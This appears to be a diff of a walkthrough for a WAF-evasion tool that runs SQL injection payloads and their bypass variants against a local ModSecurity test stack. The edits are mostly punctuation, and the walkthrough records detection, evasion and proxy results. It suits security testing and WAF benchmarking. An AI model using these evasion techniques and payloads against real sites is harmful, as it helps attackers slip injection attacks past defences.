@@ -1,13 +1,13 @@
-# Practitioner walkthrough — wafrift against ModSecurity + OWASP CRS @ PL=4
+# Practitioner walkthrough, wafrift against ModSecurity + OWASP CRS @ PL=4
 
 Live session captured **2026-05-09 with wafrift v0.2.1** against the
 in-tree `wafrift-bench/targets/modsec-pl4` stack (ModSecurity 3 + OWASP
-CRS at the most aggressive paranoia level — the strongest open-source
+CRS at the most aggressive paranoia level, the strongest open-source
 WAF default deployment). Backend: `kennethreitz/httpbin`. Probe target:
 `http://127.0.0.1:18084/get?q=<payload>`.
 
 > **Snapshot note.** The numbers and commands captured here come from
-> v0.2.1 — the current release is v0.2.17. Every command in this
+> v0.2.1: the current release is v0.2.17. Every command in this
 > walkthrough still works (the CLI surface is stable since 0.2.0); the
 > bypass rates have only improved since (see the README's "Measured
 > bypass rates" table for the current corpus run).
@@ -20,7 +20,7 @@ wafrift-bench/scripts/up.sh modsec-pl4   # already up in this session
 cargo build --release -p wafrift-cli -p wafrift-proxy
 ```
 
-## STEP 1 — naked attack (control)
+## STEP 1: naked attack (control)
 
 Five canonical payload classes, no evasion:
 
@@ -34,7 +34,7 @@ Five canonical payload classes, no evasion:
 
 Confirms PL=4 is doing its job.
 
-## STEP 2 — `wafrift detect`
+## STEP 2: `wafrift detect`
 
 ```text
 $ wafrift detect --status 403 --headers "Server: nginx" --body "Forbidden by ModSecurity"
@@ -47,7 +47,7 @@ Indicators:
 
 WAF identification correct from a single 403 + body fragment.
 
-## STEP 3 — `wafrift evade` (offline variants)
+## STEP 3: `wafrift evade` (offline variants)
 
 ```text
 $ wafrift evade --payload "1' OR 1=1--" --level heavy
@@ -57,10 +57,10 @@ Variant #3 confidence 93%   keywordless -> quote_arith_mul        Payload: '*1*'
 ... (40+ variants)
 ```
 
-Pure-offline — no target needed. Practitioner can paste any variant
+Pure-offline: no target needed. Practitioner can paste any variant
 into Burp / curl / sqlmap directly.
 
-## STEP 4 — `wafrift scan` (live SQLi against PL=4)
+## STEP 4: `wafrift scan` (live SQLi against PL=4)
 
 ```bash
 wafrift scan --target http://127.0.0.1:18084 --payload "1' OR 1=1--" \
@@ -78,7 +78,7 @@ Payload: Jy0wLSc (7 bytes)
 Reproduce: curl -G --data-urlencode q=$'Jy0wLSc' 'http://127.0.0.1:18084'
 ```
 
-## STEP 5 — `wafrift-proxy` in front of a curl session
+## STEP 5: `wafrift-proxy` in front of a curl session
 
 ```bash
 wafrift-proxy --listen 127.0.0.1:18999 \
@@ -107,7 +107,7 @@ discovery: evading WAF techniques=Applied 5 technique(s): ...
 ```
 
 The proxy stacked **5 layers of HTTP-level evasion** per failed request
-across 18 total upstream attempts. ModSec PL=4 still blocked all 18 —
+across 18 total upstream attempts. ModSec PL=4 still blocked all 18 
 because the **proxy's escalation tier is HTTP-layer-only** (UA
 rotation, header case-mixing, response-encoding mutation). It does NOT
 mutate the URL-injected payload bytes themselves; that lives in `scan`.
@@ -123,7 +123,7 @@ requests; it doesn't currently dive into URL-parameter mutation.
 Documented as known-limitation; closing the gap is a real
 post-walkthrough item.
 
-## STEP 6 — `/_wafrift/findings.md` and `/_wafrift/status` live
+## STEP 6: `/_wafrift/findings.md` and `/_wafrift/status` live
 
 ```text
 $ curl -s http://127.0.0.1:18999/_wafrift/findings.md
@@ -131,7 +131,7 @@ $ curl -s http://127.0.0.1:18999/_wafrift/findings.md
 
 Total proxied: 18 · Total WAF blocks observed: 18 · Hosts seen: 1
 
-_No bypasses discovered yet — keep traffic flowing through the proxy.
+_No bypasses discovered yet (keep traffic flowing through the proxy).
 Blocks are being recorded and will inform technique selection._
 ```
 
@@ -145,13 +145,13 @@ $ curl -s http://127.0.0.1:18999/_wafrift/status
 
 Both endpoints functional, schema-versioned, loopback-gated.
 
-## STEP 7 — Graceful shutdown + gene-bank flush
+## STEP 7: Graceful shutdown + gene-bank flush
 
 ```bash
 kill -INT $(pgrep -f "wafrift-proxy.*18999")
 ```
 
-Pre-fix: gene-bank file would persist as `{"schema":1,"hosts":{}}` —
+Pre-fix: gene-bank file would persist as `{"schema":1,"hosts":{}}` 
 host with 18 blocks but no winners/blocklisted got dropped by the
 "skip empty hosts" filter. **Fixed in this walkthrough**: hosts with
 non-zero blocks (or identified WAF) are now persisted even without
@@ -160,19 +160,19 @@ discovery cycle no longer loses the host telemetry.
 
 ## What worked end-to-end
 
-- ✅ `wafrift detect` — identified ModSecurity from 403 + body fragment
-- ✅ `wafrift evade` — generated 40+ offline variants
-- ✅ `wafrift scan` — fired 2398+ live variants, discovered bypasses,
+- ✅ `wafrift detect`: identified ModSecurity from 403 + body fragment
+- ✅ `wafrift evade`: generated 40+ offline variants
+- ✅ `wafrift scan`: fired 2398+ live variants, discovered bypasses,
        persisted 68 techniques to gene-bank
-- ✅ `wafrift-proxy` — accepted forward-proxy traffic, escalated
+- ✅ `wafrift-proxy`: accepted forward-proxy traffic, escalated
        evasion 1→5 layers per request, recorded 18 blocks against
        the host
-- ✅ `/_wafrift/status` + `/_wafrift/findings.md` — live, gated, sane
+- ✅ `/_wafrift/status` + `/_wafrift/findings.md`: live, gated, sane
 - ✅ `wafrift seed` + `wafrift bank list/export/import` (verified
-       earlier in this session) — round-trip clean
-- ✅ `wafrift report` — markdown findings writeup from the gene-bank
-- ✅ `wafrift man` — emits troff(1) for `man wafrift`
-- ✅ Graceful shutdown — SIGINT triggers gene-bank flush
+       earlier in this session), round-trip clean
+- ✅ `wafrift report`: markdown findings writeup from the gene-bank
+- ✅ `wafrift man`: emits troff(1) for `man wafrift`
+- ✅ Graceful shutdown: SIGINT triggers gene-bank flush
 
 ## Practitioner gaps surfaced by the walkthrough
 
@@ -185,7 +185,7 @@ discovery cycle no longer loses the host telemetry.
 2. **Gene-bank dropped block-only hosts.** Fixed in this commit.
 3. `--allow-private-upstream` is required for any localhost target
    (intentional SSRF protection). The error path when not set
-   silently returns a 403 from the proxy — could be more explicit.
+   silently returns a 403 from the proxy (could be more explicit).
    Logged for future polish.
 
 ## Reproducibility
